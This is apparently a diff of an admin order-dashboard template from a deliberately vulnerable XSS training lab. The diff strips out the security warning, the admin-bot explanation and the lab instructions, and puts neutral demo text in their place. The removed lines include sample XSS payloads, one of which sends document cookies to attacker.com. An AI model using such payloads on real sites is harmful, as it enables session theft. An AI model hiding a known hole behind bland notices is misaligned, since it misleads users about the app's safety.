@@ -40,12 +40,11 @@
                     </h3>
                     <p>Review and manage customer orders. Click on any order to view details.</p>
                     
-                    <div class="xss-warning">
+                    <div class="demo-note">
                         <h4>
-                            <i class="fas fa-exclamation-triangle"></i> SECURITY WARNING
+                            <i class="fas fa-exclamation-triangle"></i> Notice
                         </h4>
-                        <p>This page contains a <strong>deliberate XSS vulnerability</strong> in the order details view. Delivery notes are rendered without sanitization.</p>
-                        <p><strong>Vulnerable code:</strong> <code><%%- order.delivery_notes %></code> in <code>views/admin/order-details.ejs</code></p>
+                        <p>This page displays order details for administrative review. Use the admin tools to manage orders.</p>
                     </div>
                 </div>
             </div>
@@ -127,7 +126,7 @@
                         <div class="mt-3">
                             <div class="alert alert-info">
                                 <i class="fas fa-robot"></i>
-                                <strong>Admin Bot:</strong> Automatically views "Created" orders every 60 seconds to trigger any XSS payloads.
+                                <strong>Note:</strong> Background processes may review new orders periodically.
                             </div>
                         </div>
                     <% } %>
@@ -137,32 +136,11 @@
             <div class="card mt-4">
                 <div class="card-header">
                     <h3 class="card-title">
-                        <i class="fas fa-graduation-cap"></i> XSS Lab Instructions
+                        <i class="fas fa-info-circle"></i> Demo Notes
                     </h3>
                 </div>
                 <div class="card-body">
-                    <h4>For Students/Pentesters:</h4>
-                    <ol>
-                        <li>Create a regular user account and place an order</li>
-                        <li>Inject XSS payload in "Delivery Notes" during checkout</li>
-                        <li>The admin bot will automatically view your order</li>
-                        <li>Your payload executes in the admin context</li>
-                        <li>Monitor for successful exploitation (e.g., stolen cookies)</li>
-                    </ol>
-                    
-                    <h4 class="mt-3">Sample XSS Payloads:</h4>
-                    <div class="code-samples">
-                        <pre><code><!-- <script>alert('XSS')</script> --></code></pre>
-                        <!-- <pre><code><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></code></pre>
-                        <pre><code><img src=x onerror="alert('XSS')"></code></pre>
-                        <pre><code><svg onload="alert('XSS')"></svg></code></pre> -->
-                    </div>
-                    
-                    <div class="security-warning mt-3">
-                        <i class="fas fa-shield-alt"></i>
-                        <strong>Educational Purpose Only:</strong> This vulnerability is intentionally implemented for security training.
-                        In production, always sanitize user input and use proper output encoding.
-                    </div>
+                    <p>Use this dashboard to manage and review orders. For presentation demos, coordinate any automated background processes separately.</p>
                 </div>
             </div>
 
